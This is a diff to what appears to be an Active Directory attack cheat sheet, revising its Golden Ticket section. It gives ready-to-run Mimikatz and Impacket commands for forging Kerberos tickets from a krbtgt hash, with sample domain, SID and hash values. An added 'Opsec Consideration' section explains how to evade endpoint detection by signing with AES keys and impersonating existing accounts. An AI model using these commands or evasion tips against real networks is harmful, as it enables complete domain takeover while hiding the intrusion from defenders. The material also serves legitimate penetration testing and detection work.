@@ -788,17 +788,29 @@ getST.py range.net/ws01\$ -hashes :95e392df668ca6bd103b905856acb8a9 -impersonate
 ### Golden Ticket
 A golden ticket is signed and encrypted by the hash of krbtgt account which makes it a valid TGT ticket. The krbtgt user hash could be used to impersonate any user with any privileges from even a non-domain machine
 | Attribute   | Value                                  |
-| ---         | -----------                            |
+| ----------- | -------------------------------------- |
 | Domain      | legitcorp.local                        |
 | Domain SID  | S-1-5-21-1935943001-39345449-285568504 |
 | krbtgt hash | 7e8612a348a729bcb2f597a9cbc27c12       |
 | Username    | trex                                   |
 ```css
-# Mimikatz
+# mimikatz
 kerberos::golden /domain:legitcorp.local /sid:S-1-5-21-1935943001-39345449-285568504 /rc4:7e8612a348a729bcb2f597a9cbc27c12 /user:trex /ptt
 
-# Impacket
-ticketer.py -domain legitcorp.local -nthash 7e8612a348a729bcb2f597a9cbc27c12 -dc-ip 192.179.86.170 -domain-sid S-1-5-21-1935943001-39345449-285568504 trex
+# impacket
+ticketer.py -domain legitcorp.local -nthash 7e8612a348a729bcb2f597a9cbc27c12 -domain-sid S-1-5-21-1935943001-39345449-285568504 trex
+```
+
+**Opsec Consideration**
+In a scenario where you are working on a production domain that implements endpoint detections and sensors. You might want to avoid using *krbtgt's RC4 hash* as most of the detection mechanism detects a ticket that is encrypted/signed with a RC4 hash of krbtgt account. Always consider to **use `aes256` or `aes128` to encrypt/sign the forged ticket**. 
+
+Another thing to keep in mind is that always **use an existing account** to avoid detection as most of the detection mechanism detects the use of a non-existance account. 
+```bash
+# mimikatz
+kerberos::golden /domain:range.net /sid:S-1-5-21-1935943001-39345449-285568504 [/aes128|/aes256]:aesKey /user:exist_account /ptt
+
+# impacket
+ticketer.py -domain range.net -aesKey [AESKey] -domain-sid S-1-5-21-1935943001-39345449-285568504 exist_account
 ```
 
 ### Diamond Ticket
